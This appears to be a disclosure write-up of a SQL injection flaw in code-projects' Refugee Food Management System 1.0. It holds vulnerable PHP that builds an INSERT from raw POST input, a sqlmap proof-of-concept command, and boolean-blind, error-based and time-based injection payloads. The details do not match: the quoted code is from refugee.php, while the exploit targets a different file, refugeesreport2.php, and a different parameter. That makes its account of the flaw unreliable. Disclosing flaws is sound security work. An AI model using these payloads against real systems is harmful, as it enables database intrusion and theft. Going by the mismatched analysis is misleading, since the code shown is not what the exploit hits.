# SQLi in code-projects Refugee Food Management System 1.0 of file /home/refugee.php

**vender**:

- https://code-projects.org/refugee-food-management-system-in-php-with-source-code/

**SoftLink**:

- https://download.code-projects.org/details/491fdab9-7421-418b-93a2-bb506ba9cf02

**Vulnerable File**

- /home/refugee.php

**Version**

- V1.0

**Description**

A vulnerability was determined in code-projects Refugee Food Management System 1.0. The affected element is an unknown function of the file /home/refugee.php. This manipulation of the argument a causes sql injection. The attack is possible to be carried out remotely. The exploit has been publicly disclosed and may be utilized.

### Analyse

Line 4-32

```php
<?php
if(isset($_POST['Register'])){

$a = $_POST['refNo'];
$f = $_POST['Fname'];
$l = $_POST['Lname'];
$s = $_POST['sex'];
$aa = $_POST['age'];
$c = $_POST['contact'];
$nationality_nid= $_POST['nationality_nid'];
$date =date('Y-m-d');



$qry1 = mysql_query("
	insert into refugee
	
	values(
	'',
		'$f',
		'$l',
		'$s',
		'$aa',
		'$c',
		'$date',
		'active',
		'Null',
		'$nationality_nid',
		'$a'
		
	)
	");
```

### POC

```bash
sqlmap -u "http://192.168.93.1/Refugee/home/refugeesreport2.php" --data="a=2024-01-01&b=2024-01-02&Register=Search" --cookie="PHPSESSID=8t8psifm12nv6m77co7g5e6qo5" --level=2 --thread=10
```



```bash
---
Parameter: a (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: a=2024-01-01' AND 9921=(SELECT (CASE WHEN (9921=9921) THEN 9921 ELSE (SELECT 5472 UNION SELECT 9281) END))-- -&b=2024-01-02&Register=Search

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: a=2024-01-01' AND GTID_SUBSET(CONCAT(0x71706b7671,(SELECT (ELT(7121=7121,1))),0x7170786a71),7121) AND 'SBay'='SBay&b=2024-01-02&Register=Search

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: a=2024-01-01' AND (SELECT 4595 FROM (SELECT(SLEEP(5)))HPSS) AND 'cUAc'='cUAc&b=2024-01-02&Register=Search
---
```

